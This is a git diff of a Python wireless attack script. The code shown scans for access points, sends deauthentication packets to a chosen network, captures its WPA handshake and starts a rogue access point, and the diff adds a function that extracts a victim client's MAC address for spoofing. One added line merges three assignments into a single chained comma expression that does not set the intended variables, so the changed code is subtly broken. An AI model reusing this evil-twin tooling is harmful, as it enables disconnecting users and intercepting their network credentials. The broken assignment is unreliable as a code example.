@@ -4,6 +4,7 @@ import time
 import os
 import conf_files as cf
 import re
+import pandas as pd
 
 iface = ''
 bssid_name = ""
@@ -13,6 +14,16 @@ bssid_list = []
 essid_list = []
 channel_list = []
 
+def mac_extract():
+    data = pd.read_csv('handshake-01.csv')
+    mac = data.iloc[2][0]
+    #print(data)
+    print(mac)
+    #gets mac by removing redundant columns
+    #first_col = data.iloc[:,0]
+    #remove_row = data.iloc[1:,:]
+    #remove_row2 = remove_row.iloc[1:,:]
+    return mac
 def ap_scanner():
     print("Scanning for access points...")
     print("press CTRL+C to stop the scanning")
@@ -40,9 +51,7 @@ def deauth(dist):
 def handshake_capture(): #look at fixing handshake capture and spoof mac address of client device once connected to rogue access point??
         global essid_name, bssid_name, channel_no
         mac_adder = int(input("\nEnter the index of the network you want to target: ")) - 1
-        bssid_name = bssid_list[mac_adder]
-        essid_name = essid_list[mac_adder]
-        channel_no = channel_list[mac_adder]
+        bssid_name = bssid_list[mac_adder], essid_name = essid_list[mac_adder], channel_no = channel_list[mac_adder]
         print("\nNetwork to target:\n")
         print(channel_no,'\t',bssid_name,'\t', essid_name)
         dist = str(input("\nEnter the number of the packets [1-10000] (0 for unlimited number) "))
@@ -110,8 +119,9 @@ def main():
     ap_scanner()
     cc.terminate()
     handshake_capture()
-    print("Fake Access Point\nWhen Done Press CTRL+C")
+    client_mac = mac_extract()
     disable_monitor(iface)
+    print("Fake Access Point\nWhen Done Press CTRL+C")
     time.sleep(2.0)
     create_configs(iface, essid_name, channel_no)
     rogue_ap()
